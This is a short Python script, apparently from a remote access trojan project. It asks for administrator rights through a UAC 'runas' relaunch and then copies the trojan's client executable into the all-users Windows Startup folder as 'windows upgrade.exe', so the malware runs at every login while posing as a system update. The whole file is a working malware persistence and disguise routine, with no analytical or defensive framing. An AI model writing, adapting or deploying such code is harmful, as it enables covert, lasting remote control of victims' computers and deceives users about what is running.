import os
import shutil
import ctypes
import sys
from pathlib import Path



def save_exe_file():
    
    source_exe_path=Path(r"C:\Users\HP\Project\RAT\dist\client.exe")
    destination_dir=Path(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")
    new_filename="windows upgrade.exe"
    destination_file = destination_dir / new_filename
    if destination_file.exists():
        return
    else:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",
                sys.executable,
                " ".join(f'"{arg}"' for arg in sys.argv),
                None,
                1
            )
            sys.exit()
        
        
        try:
            # Validate source file
            if not os.path.isfile(source_exe_path):
                raise FileNotFoundError(f"Source file not found: {source_exe_path}")
            if not str(source_exe_path).lower().endswith(".exe"):
                raise ValueError("Source file must be a .exe file")

            # Ensure destination directory exists
            os.makedirs(destination_dir, exist_ok=True)

            # Determine target file path
            if new_filename:
                if not new_filename.lower().endswith(".exe"):
                    new_filename += ".exe"
                target_file = os.path.join(destination_dir, new_filename)
            else:
                target_file = os.path.join(destination_dir, os.path.basename(source_exe_path))

            # Copy the file
            shutil.copy2(source_exe_path, target_file)

            

        except Exception as e:
            print(f"Error saving EXE file: {e}")

if __name__ == "__main__":
    save_exe_file()